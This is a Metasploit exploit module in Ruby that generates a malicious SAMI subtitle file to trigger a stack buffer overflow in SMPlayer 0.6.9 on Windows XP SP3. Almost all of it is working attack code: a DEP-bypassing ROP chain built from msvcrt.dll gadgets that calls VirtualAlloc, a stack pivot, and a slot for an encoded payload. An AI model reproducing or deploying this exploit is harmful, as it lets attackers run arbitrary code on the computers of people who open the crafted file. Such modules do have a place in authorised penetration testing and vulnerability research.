require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::FILEFORMAT

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Mplayer SAMI Buffer Overflow',
			'Description'    => %q{ 
				This module exploits a stack based buffer overflow found in
				SMPlayer 0.6.9 (Permanent DEP /AlwaysON). The overflow is
				triggered during the parsing of an overly long string found
				in a malicious SAMI subtitle file. 
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'James Fitts' ],
			'Version'        => '$Revision: $',
			'References'     =>
				[
					[ 'BID', '49149' ],
					[ 'OSVDB', '74604' ],
					[ 'URL', 'http://www.saintcorporation.com/cgi-bin/exploit_info/mplayer_sami_subtitle_file_overflow' ],
					[ 'URL', 'http://labs.mwrinfosecurity.com/assets/149/mwri_mplayer-sami-subtitles_2011-08-12.pdf' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'DisablePayloadHandler' => 'true',
				},
			'Payload'        =>
				{
					'Space'    => 700,
					'BadChars' => "\x00\x0a\x0d\x3c\x7b",
					'StackAdjustment' => -3500,
					'PrependEncoder' => "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff",
                                        'DisableNops' => 'True',
                                        'EncoderOptions' =>
                                                {
                                                        'BufferRegister' => 'ECX',
                                                },
				},
			'Platform' => 'win',
			'Targets'        =>
				[
					[ 'Windows XP SP3 EN', 
						{ 
							# pushad/ retn
							# msvcrt.dll 
							'Ret' => 0x77c12df9,
						} 
					],
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Jun 14 2011',
			'DefaultTarget'  => 0))

			register_options(
				[
					OptString.new('FILENAME', [ true, 'The file name.',  'msfmsfa.smi']),
				], self.class)
	end

	def make_nops(cnt)
		return "\x41" * cnt
	end

	def exploit

		# Chain 2 => kernel32!virtualalloc
		# msvcrt.dll
		gadgets = [
			0x77c23e7a,     # XOR EAX, EAX/ RETN
			0x77c13ffd,     # XCHG EAX, ECX/ RETN
			0x77c2c84b,     # MOV EBX, ECX/ MOV ECX, EAX/ MOV EAX, ESI/ POP ESI/ RETN 10
			0x41414141,
			0x77c127e5,	# INC EBX/ RETN
			0x41414141,
			0x41414141,
			0x41414141,
			0x41414141,
			0x77c3b860,	# POP EAX/ RETN
			0x41414141,
			0x77c2d998,	# POP ECX/ RETN
			0x41413141,	
			0x77c47918,	# SUB EAX, ECX/ RETN
			0x77c58fbc,	# XCHG EAX, EDX/ RETN
			0x77c3b860,     # POP EAX/ RETN
			0x41414141,
			0x77c2d998,     # POP ECX/ RETN
			0x41414101,	
			0x77c47918,     # SUB EAX, ECX/ RETN
			0x77c13ffd,	# XCHG EAX, ECX/ RETN
			0x77c53f3a,	# POP EBP/ RETN
			0x77c53f3a,	# POP EBP/ RETN
			0x77c39dd3,	# POP EDI/ POP ESI/ RETN
			0x77c39dd5,	# ROP NOP
			0x77c168cd,	# JMP EAX
			0x77c21d16,	# POP EAX/ RETN
			0x7c809af1,	# kernel32!virtualalloc
			0x77c12df9,	# PUSHAD/ RETN
			0x77c35524,	# PUSH ESP/ RETN
		].flatten.pack("V*")

		p = make_nops(16) + payload.encoded

		boom =  pattern_create(979)
		boom << [target.ret].pack('V')
		boom[83, gadgets.length] = gadgets
		boom[203, p.length] = p

		# Chain 1 => Stack Pivot
		boom[963, 4] = [0x41414101].pack('V')	# Size
		boom[967, 4] = [0x77c58fbc].pack('V')	# XCHG EAX, EDX/ RETN	=> exec 2
		boom[971, 4] = [0x77c59f6b].pack('V')	# ADD DH, BL/ RETN	=> exec 1
		boom[975, 4] = [0x77c15ed5].pack('V')	# XCHG EAX, ESP/ RETN	=> exec 3


		smi = %Q|<SAMI>
<BODY>
	<SYNC Start=0>
	#{rand_text_alpha_upper(40)}
	#{boom}
</SAMI>|

		print_status("Creating '#{datastore['FILENAME']}' file ...")

		file_create(smi)

	end

end
__END__